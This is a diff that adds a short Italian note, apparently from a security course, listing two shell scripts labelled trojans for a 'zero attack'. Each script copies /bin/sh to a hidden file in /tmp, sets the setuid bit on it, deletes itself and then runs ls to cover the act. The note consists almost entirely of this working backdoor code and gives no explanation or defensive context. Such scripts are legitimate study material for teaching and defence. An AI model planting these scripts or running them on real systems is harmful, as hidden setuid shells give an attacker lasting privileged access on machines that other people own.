@@ -1,0 +1,20 @@
+In questo documento sono presenti entrambi i trojan visti per l'attacco zero:
+
+TrojanV1.sh
+##############################
+cp /bin/sh /tmp/.xxsh
+chmod u+sx /tmp/.xxsh
+rm ./TrojanV1.sh
+ls
+##############################
+
+
+
+TrojanV2.sh
+##############################
+cp /bin/sh ./.xxshV2
+chmod u+sx .xxshV2
+mv .xxshV2 /tmp
+rm ./trojanV2.sh
+ls
+##############################
